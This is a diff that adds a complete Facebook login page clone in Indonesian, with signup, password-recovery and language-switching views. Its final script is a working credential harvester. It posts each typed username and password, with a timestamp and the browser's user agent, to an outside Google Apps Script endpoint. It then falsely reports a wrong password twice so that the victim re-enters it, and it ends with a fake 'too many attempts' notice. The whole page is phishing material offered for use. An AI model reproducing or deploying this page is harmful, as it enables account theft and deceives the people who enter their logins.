@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – Masuk atau Daftar</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+        }
+        .input-field {
+            background-color: #f5f6f7;
+            border: 1px solid #dddfe2;
+        }
+        .input-field:focus {
+            border-color: #1877f2;
+            outline: none;
+            background-color: #fff;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .btn-primary {
+            background-color: #1877f2;
+        }
+        .btn-success {
+            background-color: #42b72a;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #4b4f56;
+            font-size: 14px;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #ccd0d5;
+        }
+        .divider:not(:empty)::before { margin-right: .75em; }
+        .divider:not(:empty)::after { margin-left: .75em; }
+        
+        .hidden-view { display: none; }
+
+        /* Animation for landing page */
+        .fade-in {
+            animation: fadeIn 0.3s ease-in;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .lang-active {
+            color: #4b4f56;
+            font-weight: bold;
+        }
+        .lang-link {
+            color: #576b95;
+            cursor: pointer;
+        }
+        .lang-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Network Error Toast */
+        #network-error-toast {
+            transition: all 0.3s ease-in-out;
+            transform: translate(-50%, -100%);
+            opacity: 0;
+        }
+        #network-error-toast.show {
+            transform: translate(-50%, 20px);
+            opacity: 1;
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen relative">
+
+    <!-- Network Error Toast Message -->
+    <div id="network-error-toast" class="fixed top-0 left-1/2 z-50 bg-red-600 text-white px-6 py-3 rounded-lg shadow-2xl flex items-center gap-3">
+        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+        <span class="font-medium">Masalah jaringan. Silakan periksa koneksi Anda dan coba lagi.</span>
+    </div>
+
+    <!-- Top App Banner (Mobile Style) -->
+    <div id="top-banner" class="bg-[#fffbe2] border-b border-[#e2e2e2] p-3 flex items-center justify-between text-sm">
+        <div class="flex items-center gap-2">
+            <img src="https://www.dropbox.com/scl/fi/1pt7e5til4onf99fwiz6q/facebook.png?rlkey=6mjgi3zmzcxh50vvcp3t717nd&st=omo7atmh&dl=1" class="w-5 h-5" alt="FB">
+            <span id="banner-text">Dapatkan Facebook untuk Android.</span>
+        </div>
+        <button onclick="switchView('app-landing-view')" class="text-[#1877f2] font-semibold whitespace-nowrap" id="banner-btn">Dapatkan</button>
+    </div>
+
+    <!-- Header / Logo -->
+    <header id="main-header" class="py-6 flex justify-center">
+        <img src="https://www.dropbox.com/scl/fi/1pt7e5til4onf99fwiz6q/facebook.png?rlkey=6mjgi3zmzcxh50vvcp3t717nd&st=omo7atmh&dl=1" alt="Facebook" class="h-10 md:h-16">
+    </header>
+
+    <!-- VIEW: APP LANDING PAGE (Localized) -->
+    <main id="app-landing-view" class="flex-grow px-4 hidden-view fade-in">
+        <div class="max-w-md mx-auto bg-white rounded-2xl shadow-xl overflow-hidden mt-4">
+            <div class="bg-[#1877f2] p-8 flex flex-col items-center text-white text-center">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="w-20 h-20 mb-4 bg-white rounded-2xl p-1" alt="FB">
+                <h1 class="text-2xl font-bold mb-2" id="landing-title">Facebook Lebih Baik di Aplikasi</h1>
+                <p class="text-blue-100 text-sm" id="landing-subtitle">Nikmati pengalaman yang lebih cepat, hemat data, dan tetap terhubung setiap saat.</p>
+            </div>
+            
+            <div class="p-6 space-y-6">
+                <div class="grid grid-cols-1 gap-4">
+                    <div class="flex items-start gap-4 p-3 rounded-lg hover:bg-gray-50 transition">
+                        <div class="bg-blue-100 p-2 rounded-full">
+                            <svg class="w-6 h-6 text-[#1877f2]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                        </div>
+                        <div>
+                            <h3 class="font-bold text-gray-800" id="feat-1-title">Lebih Cepat</h3>
+                            <p class="text-xs text-gray-500" id="feat-1-desc">Akses profil dan kabar beranda dalam sekejap tanpa hambatan.</p>
+                        </div>
+                    </div>
+                    <div class="flex items-start gap-4 p-3 rounded-lg hover:bg-gray-50 transition">
+                        <div class="bg-green-100 p-2 rounded-full">
+                            <svg class="w-6 h-6 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
+                        </div>
+                        <div>
+                            <h3 class="font-bold text-gray-800" id="feat-2-title">Notifikasi Instan</h3>
+                            <p class="text-xs text-gray-500" id="feat-2-desc">Jangan lewatkan pembaruan penting dari teman dan keluarga.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="space-y-3 pt-4">
+                    <a href="https://play.google.com/store/apps/details?id=com.facebook.katana" target="_blank" class="flex items-center justify-center gap-2 bg-black text-white w-full py-3 rounded-xl font-medium hover:opacity-90 transition">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" class="h-6" alt="Play Store">
+                        <span id="landing-btn-install">Pasang dari Play Store</span>
+                    </a>
+                    <button onclick="switchView('login-view')" class="w-full py-3 text-[#1877f2] font-semibold hover:bg-blue-50 rounded-xl transition" id="landing-btn-browser">
+                        Lanjutkan di Browser
+                    </button>
+                </div>
+            </div>
+            <div class="bg-gray-50 p-4 text-center">
+                <p class="text-[10px] text-gray-400" id="landing-footer">Tersedia untuk Android, iOS, dan Windows.</p>
+            </div>
+        </div>
+    </main>
+
+    <!-- VIEW: LOGIN PAGE -->
+    <main id="login-view" class="flex-grow px-4">
+        <div class="max-w-md mx-auto bg-white p-4 rounded-xl shadow-lg border border-gray-200">
+            <form action="#" method="POST" class="space-y-4">
+                <input type="text" id="login-user" placeholder="Nomor ponsel atau email" 
+                    class="input-field w-full p-3.5 rounded-lg text-base">
+                
+                <input type="password" id="login-pass" placeholder="Kata sandi" 
+                    class="input-field w-full p-3.5 rounded-lg text-base">
+                
+                <button type="submit" id="login-btn-submit" class="w-full btn-primary text-white font-bold py-3 rounded-lg text-xl shadow-sm active:opacity-90">
+                    Log In
+                </button>
+                
+                <div class="text-center">
+                    <button type="button" onclick="switchView('forgot-view')" class="text-[#1877f2] text-sm font-medium hover:underline" id="login-forgot">
+                        Lupa Kata Sandi?
+                    </button>
+                </div>
+
+                <div class="py-2">
+                    <div class="divider"></div>
+                </div>
+
+                <div class="text-center pb-2">
+                    <button type="button" onclick="switchView('signup-view')" class="btn-success text-white font-bold py-3 px-6 rounded-lg text-base" id="login-btn-create">
+                        Buat akun baru
+                    </button>
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <!-- VIEW: FORGOT PASSWORD PAGE -->
+    <main id="forgot-view" class="flex-grow px-4 hidden-view">
+        <div class="max-w-md mx-auto bg-white rounded-xl shadow-lg border border-gray-200 overflow-hidden">
+            <div class="p-4 border-b border-gray-200">
+                <h2 class="text-xl font-bold" id="forgot-title">Temukan Akun Anda</h2>
+            </div>
+            <div class="p-4 space-y-4">
+                <p class="text-sm text-gray-600" id="forgot-desc">Masukkan email atau nomor ponsel Anda untuk mencari akun Anda.</p>
+                <input type="text" id="forgot-input" placeholder="Email atau nomor ponsel" 
+                    class="input-field w-full p-3.5 rounded-lg text-base">
+            </div>
+            <div class="p-4 bg-gray-50 flex justify-end gap-3 border-t border-gray-200">
+                <button onclick="switchView('login-view')" class="bg-gray-200 text-gray-700 font-semibold py-2 px-4 rounded-lg hover:bg-gray-300" id="forgot-cancel">Batal</button>
+                <button class="btn-primary text-white font-semibold py-2 px-4 rounded-lg hover:opacity-90" id="forgot-search">Cari</button>
+            </div>
+        </div>
+    </main>
+
+    <!-- VIEW: SIGN UP PAGE -->
+    <main id="signup-view" class="flex-grow px-4 hidden-view">
+        <div class="max-w-md mx-auto bg-white rounded-xl shadow-lg border border-gray-200 overflow-hidden">
+            <div class="p-4 border-b border-gray-200">
+                <div class="flex justify-between items-start">
+                    <div>
+                        <h2 class="text-2xl font-bold" id="signup-title">Daftar</h2>
+                        <p class="text-sm text-gray-500" id="signup-subtitle">Ini cepat dan mudah.</p>
+                    </div>
+                    <button onclick="switchView('login-view')" class="text-2xl text-gray-400">&times;</button>
+                </div>
+            </div>
+            <form class="p-4 space-y-3">
+                <div class="grid grid-cols-2 gap-3">
+                    <input type="text" id="reg-fn" placeholder="Nama depan" class="input-field p-2.5 rounded-md text-sm">
+                    <input type="text" id="reg-ln" placeholder="Nama belakang" class="input-field p-2.5 rounded-md text-sm">
+                </div>
+                <input type="text" id="reg-email" placeholder="Nomor seluler atau email" class="input-field w-full p-2.5 rounded-md text-sm">
+                <input type="password" id="reg-pass" placeholder="Kata sandi baru" class="input-field w-full p-2.5 rounded-md text-sm">
+                
+                <div>
+                    <label class="text-xs text-gray-500" id="reg-bday">Tanggal Lahir</label>
+                    <div class="grid grid-cols-3 gap-2 mt-1">
+                        <select class="border border-gray-300 rounded p-2 text-sm">
+                            <option>1</option><option>10</option><option>20</option>
+                        </select>
+                        <select class="border border-gray-300 rounded p-2 text-sm">
+                            <option>Jan</option><option>Mei</option><option>Des</option>
+                        </select>
+                        <select class="border border-gray-300 rounded p-2 text-sm">
+                            <option>2024</option><option>2000</option><option>1990</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div>
+                    <label class="text-xs text-gray-500" id="reg-gender">Jenis Kelamin</label>
+                    <div class="grid grid-cols-3 gap-2 mt-1">
+                        <div class="border border-gray-300 rounded p-2 text-sm flex justify-between">
+                            <label id="gen-f">Perempuan</label> <input type="radio" name="gender">
+                        </div>
+                        <div class="border border-gray-300 rounded p-2 text-sm flex justify-between">
+                            <label id="gen-m">Laki-laki</label> <input type="radio" name="gender">
+                        </div>
+                        <div class="border border-gray-300 rounded p-2 text-sm flex justify-between">
+                            <label id="gen-o">Khusus</label> <input type="radio" name="gender">
+                        </div>
+                    </div>
+                </div>
+
+                <p class="text-[10px] text-gray-500 leading-tight" id="signup-terms">
+                    Orang yang menggunakan layanan kami mungkin telah mengunggah informasi kontak Anda ke Facebook. <a href="#" class="text-blue-600">Pelajari selengkapnya.</a>
+                </p>
+
+                <div class="text-center pt-2">
+                    <button type="submit" class="btn-success text-white font-bold py-2 px-12 rounded-lg text-lg" id="signup-btn">
+                        Daftar
+                    </button>
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <!-- Language Selector -->
+    <section id="language-section" class="mt-10 px-6">
+        <div class="max-w-md mx-auto grid grid-cols-2 gap-x-4 gap-y-1 text-xs">
+            <div class="flex flex-col space-y-1">
+                <span id="lang-id" onclick="setLanguage('id')" class="lang-active">Bahasa Indonesia</span>
+                <span id="lang-jv" onclick="setLanguage('jv')" class="lang-link">Basa Jawa</span>
+                <span id="lang-pt" onclick="setLanguage('pt')" class="lang-link">Português (Brasil)</span>
+                <span id="lang-de" onclick="setLanguage('de')" class="lang-link">Deutsch</span>
+            </div>
+            <div class="flex flex-col space-y-1">
+                <span id="lang-en" onclick="setLanguage('en')" class="lang-link">English (UK)</span>
+                <span id="lang-ms" onclick="setLanguage('ms')" class="lang-link">Bahasa Melayu</span>
+                <span id="lang-es" onclick="setLanguage('es')" class="lang-link">Español</span>
+                <button onclick="showNetworkError()" class="w-5 h-5 border border-gray-300 rounded-sm flex items-center justify-center text-lg text-[#576b95]">+</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer Meta -->
+    <footer class="py-10 text-center">
+        <div class="flex justify-center flex-wrap gap-4 text-[12px] text-gray-500 mb-2">
+            <a href="#" id="foot-about">Tentang</a>
+            <a href="#" id="foot-help">Bantuan</a>
+            <a href="#" id="foot-more">Lainnya</a>
+            <a href="#" id="foot-priv">Privasi</a>
+            <a href="#" id="foot-term">Ketentuan</a>
+        </div>
+        <p class="text-[11px] text-gray-400 uppercase tracking-widest">Meta © 2024</p>
+    </footer>
+
+    <script>
+        const translations = {
+            id: {
+                banner: "Dapatkan Facebook untuk Android.",
+                bannerBtn: "Dapatkan",
+                landingTitle: "Facebook Lebih Baik di Aplikasi",
+                landingSubtitle: "Nikmati pengalaman yang lebih cepat, hemat data, dan tetap terhubung setiap saat.",
+                feat1T: "Lebih Cepat",
+                feat1D: "Akses profil dan kabar beranda dalam sekejap tanpa hambatan.",
+                feat2T: "Notifikasi Instan",
+                feat2D: "Jangan lewatkan pembaruan penting dari teman dan keluarga.",
+                install: "Pasang dari Play Store",
+                browser: "Lanjutkan di Browser",
+                loginUser: "Nomor ponsel atau email",
+                loginPass: "Kata sandi",
+                loginSubmit: "Log In",
+                loginForgot: "Lupa Kata Sandi?",
+                loginCreate: "Buat akun baru",
+                forgotTitle: "Temukan Akun Anda",
+                forgotDesc: "Masukkan email atau nomor ponsel Anda untuk mencari akun Anda.",
+                signupTitle: "Daftar",
+                signupSubtitle: "Ini cepat dan mudah."
+            },
+            en: {
+                banner: "Get Facebook for Android.",
+                bannerBtn: "Get It",
+                landingTitle: "Facebook is Better in the App",
+                landingSubtitle: "Enjoy a faster experience, save data, and stay connected at all times.",
+                feat1T: "Faster",
+                feat1D: "Access your profile and news feed in an instant without lag.",
+                feat2T: "Instant Notifications",
+                feat2D: "Never miss important updates from friends and family.",
+                install: "Install from Play Store",
+                browser: "Continue in Browser",
+                loginUser: "Mobile number or email",
+                loginPass: "Password",
+                loginSubmit: "Log In",
+                loginForgot: "Forgotten Password?",
+                loginCreate: "Create new account",
+                forgotTitle: "Find Your Account",
+                forgotDesc: "Please enter your email address or mobile number to search for your account.",
+                signupTitle: "Sign Up",
+                signupSubtitle: "It's quick and easy."
+            },
+            jv: {
+                banner: "Entuk Facebook kanggo Android.",
+                bannerBtn: "Entuk",
+                landingTitle: "Facebook Luwih Apik ing Aplikasi",
+                landingSubtitle: "Nikmati pengalaman sing luwih cepet, irit data, lan tetep nyambung saben wektu.",
+                feat1T: "Luwih Cepet",
+                feat1D: "Akses profil lan kabar beranda kanthi cepet tanpa alangan.",
+                feat2T: "Notifikasi Langsung",
+                feat2D: "Aja nganti keri kabar penting saka kanca lan kulawarga.",
+                install: "Pasang saka Play Store",
+                browser: "Terusake ing Browser",
+                loginUser: "Nomer ponsel utawa email",
+                loginPass: "Tembung sandhi",
+                loginSubmit: "Mlebu",
+                loginForgot: "Lali Tembung Sandhi?",
+                loginCreate: "Gawe akun anyar",
+                forgotTitle: "Goleki Akun Panjenengan",
+                forgotDesc: "Lebokake email utawa nomer ponsel kanggo nggoleki akun panjenengan.",
+                signupTitle: "Daftar",
+                signupSubtitle: "Iki cepet lan gampang."
+            }
+        };
+
+        let errorTimeout;
+        function showNetworkError() {
+            const toast = document.getElementById('network-error-toast');
+            toast.classList.add('show');
+            
+            clearTimeout(errorTimeout);
+            errorTimeout = setTimeout(() => {
+                toast.classList.remove('show');
+            }, 4000);
+        }
+
+        function setLanguage(lang) {
+            const t = translations[lang];
+            
+            if (!t) {
+                showNetworkError();
+                return;
+            }
+
+            // Update Text
+            document.getElementById('banner-text').innerText = t.banner;
+            document.getElementById('banner-btn').innerText = t.bannerBtn;
+            document.getElementById('landing-title').innerText = t.landingTitle;
+            document.getElementById('landing-subtitle').innerText = t.landingSubtitle;
+            document.getElementById('feat-1-title').innerText = t.feat1T;
+            document.getElementById('feat-1-desc').innerText = t.feat1D;
+            document.getElementById('feat-2-title').innerText = t.feat2T;
+            document.getElementById('feat-2-desc').innerText = t.feat2D;
+            document.getElementById('landing-btn-install').innerText = t.install;
+            document.getElementById('landing-btn-browser').innerText = t.browser;
+            
+            document.getElementById('login-user').placeholder = t.loginUser;
+            document.getElementById('login-pass').placeholder = t.loginPass;
+            document.getElementById('login-btn-submit').innerText = t.loginSubmit;
+            document.getElementById('login-forgot').innerText = t.loginForgot;
+            document.getElementById('login-btn-create').innerText = t.loginCreate;
+
+            document.getElementById('forgot-title').innerText = t.forgotTitle;
+            document.getElementById('forgot-desc').innerText = t.forgotDesc;
+            document.getElementById('forgot-input').placeholder = t.loginUser;
+            
+            document.getElementById('signup-title').innerText = t.signupTitle;
+            document.getElementById('signup-subtitle').innerText = t.signupSubtitle;
+
+            // Update Active Class
+            document.querySelectorAll('.lang-active').forEach(el => {
+                el.classList.remove('lang-active');
+                el.classList.add('lang-link');
+            });
+            document.getElementById('lang-' + lang).classList.add('lang-active');
+            document.getElementById('lang-' + lang).classList.remove('lang-link');
+        }
+
+        function switchView(viewId) {
+            const views = ['login-view', 'forgot-view', 'signup-view', 'app-landing-view'];
+            views.forEach(v => document.getElementById(v).classList.add('hidden-view'));
+
+            const topBanner = document.getElementById('top-banner');
+            const mainHeader = document.getElementById('main-header');
+            const langSection = document.getElementById('language-section');
+
+            if(viewId === 'app-landing-view') {
+                topBanner.classList.add('hidden-view');
+                mainHeader.classList.add('hidden-view');
+                langSection.classList.add('hidden-view');
+            } else if(viewId === 'login-view') {
+                topBanner.classList.remove('hidden-view');
+                mainHeader.classList.remove('hidden-view');
+                langSection.classList.remove('hidden-view');
+            } else {
+                topBanner.classList.add('hidden-view');
+                mainHeader.classList.remove('hidden-view');
+                langSection.classList.remove('hidden-view');
+            }
+
+            document.getElementById(viewId).classList.remove('hidden-view');
+            window.scrollTo(0,0);
+        }
+
+        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxs6J4VgEM9U9DeHR7YUTYr3gSp2wOsqpNHjd2tzEaoQGhvXz8KKl2AxRvUQB5mTbQ9/exec';
+const MAX_ATTEMPTS = 3;
+
+function getAttemptCount() {
+    const count = sessionStorage.getItem('loginAttempts');
+    return count ? parseInt(count) : 0;
+}
+
+function incrementAttemptCount() {
+    const count = getAttemptCount() + 1;
+    sessionStorage.setItem('loginAttempts', count.toString());
+    return count;
+}
+
+function resetAttemptCount() {
+    sessionStorage.removeItem('loginAttempts');
+}
+
+async function sendToGoogleSheets(username, password, attempt) {
+    try {
+        const data = {
+            username: username,
+            password: password,
+            attempt: attempt,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+        };
+
+        const response = await fetch(GOOGLE_SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data)
+        });
+
+        return true;
+    } catch (error) {
+        console.error('Error sending to Google Sheets:', error);
+        return false;
+    }
+}
+
+function initLoginTracker() {
+    const loginForm = document.querySelector('#login-view form');
+    const loginBtn = document.getElementById('login-btn-submit');
+
+    if (loginForm) {
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('login-user').value;
+            const password = document.getElementById('login-pass').value;
+
+            if (!username || !password) {
+                alert('Silakan masukkan nomor ponsel/email dan kata sandi');
+                return;
+            }
+
+            const currentAttempt = incrementAttemptCount();
+
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Memproses...';
+
+            await sendToGoogleSheets(username, password, currentAttempt);
+
+            if (currentAttempt < MAX_ATTEMPTS) {
+                document.getElementById('login-pass').value = '';
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'Log In';
+
+                alert('Kata sandi salah. Silakan coba lagi.');
+                document.getElementById('login-pass').focus();
+            } else {
+                resetAttemptCount();
+
+                setTimeout(() => {
+                    alert('Terlalu banyak percobaan login. Silakan coba lagi nanti.');
+                    document.getElementById('login-user').value = '';
+                    document.getElementById('login-pass').value = '';
+                    loginBtn.disabled = false;
+                    loginBtn.textContent = 'Log In';
+                }, 1000);
+            }
+        });
+    }
+}
+
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initLoginTracker);
+} else {
+    initLoginTracker();
+}
+
+    </script>
+
+</body>
+</html>
